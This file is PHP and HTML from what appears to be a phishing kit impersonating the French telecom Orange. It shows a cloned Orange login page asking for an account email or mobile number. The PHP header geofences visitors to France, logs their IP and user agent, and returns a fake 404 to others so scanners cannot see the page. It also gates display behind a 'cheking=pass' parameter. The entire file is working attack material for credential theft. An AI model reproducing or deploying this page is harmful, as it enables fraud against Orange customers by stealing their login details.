<?php
$fine = "page";
(@require_once './init.php') or die("<h1>Your File Not Including init</h1>");
static_user($ip,$user_agent,$current_date);
if($country !== "france" || check_validate($ip,$dream) !== true):
    
    header("HTTP/1.1 404 Not Found");
    exit();
endif;

(isset($_GET['cheking'])) ? ($_GET['cheking'] == $_GET['cheking']): $_GET['cheking'] = "noting";
$sec = filter_var($_GET['cheking'],FILTER_SANITIZE_STRING);
if($_SERVER['REQUEST_METHOD'] !== "POST" && isset($_GET['cheking']) && isset($_GET['id']) && $sec == "pass"):

    

?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange</title>
    <link rel="apple-touch-icon" sizes="57x57" href="icons/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="icons/apple-touch-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="icons/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="icons/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="icons/apple-touch-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="icons/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="icons/apple-touch-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="icons/apple-touch-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="icons/apple-touch-icon-180x180.png">

    <link rel="icon" type="image/png" href="icons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="icons/favicon-194x194.png" sizes="194x194">
    <link rel="icon" type="image/png" href="icons/favicon-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="icons/android-chrome-36x36.png" sizes="36x36">
    <link rel="icon" type="image/png" href="icons/android-chrome-48x48.png" sizes="48x48">
    <link rel="icon" type="image/png" href="icons/android-chrome-72x72.png" sizes="72x72">
    <link rel="icon" type="image/png" href="icons/android-chrome-96x96.png" sizes="96x96">
    <link rel="icon" type="image/png" href="icons/android-chrome-144x144.png" sizes="144x144">
    <link rel="icon" type="image/png" href="icons/android-chrome-192x192.png" sizes="192x192">
    <link rel="icon" type="image/png" href="icons/favicon-16x16.png" sizes="16x16">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="stylesheet" href="./css/media.css">
    <link rel="stylesheet" href="./css/pg1.css">
</head>

<body>

    <div class="countainer">
        <!-- Hena header -->
        <div class="ck_header">
            <div class="ck_hd_cont">
                <div class="ck_hd_cont_tag">

                </div>
                <div class="ck_hd_cont_tag2">
                    <div class="ck_hd_cont_tag2_lft"></div>
                    <div class="ck_hd_tag2_cnter">
                        <div class="lika">Mobiles et forfaits</div>
                        <div class="lika">Internet</div>
                        <div class="lika">Packs Internet + Mobile</div>
                        <div class="lika">Maison</div>
                        <div class="lika">TV et divertissement</div>
                        <div class="lika">Banque</div>
                        <div class="lika">News</div>
                    </div>
                    <div class="ck_hd_tag2_right hide"></div>
                </div>
            </div>
        </div>
        <!-- Hena fin header -->
        <div class="bodys">
            <div class="bodys_top">
                <div class="bodys_bodys">
                    <div class="bodys_ct_tp">
                        <div class="kolza_dplk">
                            <h1>Pour vous identifier</h1><br>
                            <div class="infos">
                                <div class="infos_lft"></div>
                                <div class="infos_right">
                                    <h3>C’est votre première connexion ?</h3><br>
                                    <p>Vous devez d’abord finaliser la création de votre compte. Pour cela, saisissez l’adresse e-mail Orange ou le numéro de mobile fournis lors de votre souscription.</p>
                                </div>


                            </div>
                            <br>
                            <h2>Indiquez votre compte Orange</h2><br>
                            <label for="">Adresse e-mail ou n° de mobile Orange</label><br><br>
                            <input type="text" class="" id="put1"><br>
                            <div class="olkaz">
                                <div class="olkaz_left"><a href="#">Comment retrouver l’adresse e-mail de votre compte</a></div>
                                <div class="olkaz_right"><img src="./img/fli.png" alt=""></div>
                            </div>

                            <div class="buttos snd1">Continuer</div>

                        </div>

                    </div>
                    <hr>
                    <div class="ppppp">
                        <div class="pppp-top">
                            <div class="pppp-top-lft">
                                <a href="#">Créer un compte sans être client Orange</a>
                            </div>
                            <div class="pppp-top-rght"></div>
                        </div>
                        <div class="pppp-bot">
                            <div class="pppp-top-lft">
                                <a href="#">Besoin d’aide ?</a>
                            </div>
                            <div class="pppp-top-rght"></div>
                        </div>
                    </div>
                </div>

            </div>
        </div>

        <!-- Hena footer -->
        <div class="footers">
            <div class="footers_tg1">
                <div class="kolz sturt">

                </div>
            </div>
            <div class="footers_tg2">
                <div class="kolz navos">
                    <ul>
                        <li>Informations légales</li>
                        <li>Données personnelles</li>
                        <li>Accessibilité</li>
                        <li>Gestion cookies</li>
                        <li>Politique des cookies</li>
                        <li>Publicité</li>
                        <li>Internet +</li>
                        <li>Signaler un contenu</li>
                        <li>© Orange 2021</li>
                    </ul>
                </div>
            </div>
        </div>

    </div>
    <script src="./js/jquery.js"></script>
    <script src="./js/main.js"></script>
</body>

</html>


<?php

else:

    
    go_to($go_index.$id);
    ob_end_flush();
endif;